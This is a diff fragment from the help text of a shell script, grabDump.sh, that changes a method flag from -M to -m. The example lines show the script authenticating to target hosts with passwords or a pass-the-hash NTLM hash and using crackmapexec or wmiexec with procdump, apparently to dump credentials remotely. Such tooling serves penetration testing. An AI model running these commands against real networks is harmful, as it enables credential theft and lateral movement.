@@ -45,10 +45,10 @@ Flags:
   -f    File containing IP Addresses or Hostnames of targets. Separated by newline.
   -h    Help text and usage example.
 
-usage:   grabDump.sh -d <domain> -u <username> -p <password> -H <hash> -f <file of target hosts> -P <procdump.exe> -M crackmapexec
-example: grabDump.sh -d GIBSON -u zerocool -p hunter2 -f hostlist.txt -P /root/procdump.exe -M crackmapexec
-example: grabDump.sh -d . -u Administrator -p Welcome -f hostlist.txt -P /root/procdump.exe -M wmiexec
-example: grabDump.sh -d . -u Administrator -H F62A5ADEF2F76CA4712AC820F34BA148 -f hostlist.txt -P /root/procdump64.exe -M crackmapexec
+usage:   grabDump.sh -d <domain> -u <username> -p <password> -H <hash> -f <file of target hosts> -P <procdump.exe> -m crackmapexec
+example: grabDump.sh -d GIBSON -u zerocool -p hunter2 -f hostlist.txt -P /root/procdump.exe -m crackmapexec
+example: grabDump.sh -d . -u Administrator -p Welcome -f hostlist.txt -P /root/procdump.exe -m wmiexec
+example: grabDump.sh -d . -u Administrator -H F62A5ADEF2F76CA4712AC820F34BA148 -f hostlist.txt -P /root/procdump64.exe -m crackmapexec
 "
 
 # Check if any flags were set. If not, print out help.
